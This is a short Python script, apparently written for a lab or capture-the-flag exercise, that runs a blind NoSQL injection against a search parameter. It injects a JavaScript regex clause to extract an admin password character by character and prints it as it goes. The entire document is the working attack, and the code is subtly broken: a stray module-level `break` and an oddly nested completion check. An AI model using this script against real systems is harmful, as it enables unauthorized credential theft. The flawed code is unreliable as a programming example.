import requests
from bs4 import BeautifulSoup

alpha = "abcdef0123456789-_" #caracteres de la passwd mencionados en el ejercio

url = 'http://example/'

passwd = ''
payload = ''
while True:
    for i in alpha:
        payload = passwd + i
        burp0_url = f"{url}?search=admin%27%20%26%26%20this.password.match(/^{payload}.*$/)%00"

        resp = requests.get(burp0_url)

        soup = BeautifulSoup(resp.text, 'html.parser')

        if soup.find_all(href='?search=admin'):
            #print(f"Found {i}")
            passwd = passwd + i
            print(f"Password: {passwd}", flush=True, end="\r")
            break
            
        #checking for complete passwd
        burp0_url = f"{url}?search=admin%27%20%26%26%20this.password.match(/^{passwd}$/)%00"
        resp = requests.get(burp0_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        if soup.find_all(href='?search=admin'):
            print(f"[+] Password found: {passwd}")
            break
break
